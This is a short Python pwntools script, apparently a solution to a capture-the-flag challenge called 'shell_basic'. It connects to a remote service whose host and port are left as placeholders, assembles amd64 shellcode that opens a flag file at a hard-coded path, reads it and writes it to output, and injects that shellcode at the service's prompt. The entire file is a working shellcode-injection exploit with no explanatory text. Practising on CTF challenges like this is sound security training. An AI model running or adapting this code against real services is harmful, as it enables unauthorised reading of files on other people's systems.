#!/usr/bin/python3
#Name: S4_06_shell_basic.py

from pwn import *

r = remote('<host>', <port>) # 'example.com', 7777
context.arch = 'amd64' # 64-bit
p = '/home/shell_basic/flag_name_is_loooooong'

shellcode = ''
shellcode += shellcraft.open(p)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

r.recvuntil("shellcode: ")
r.sendline(asm(shellcode))

r.interactive()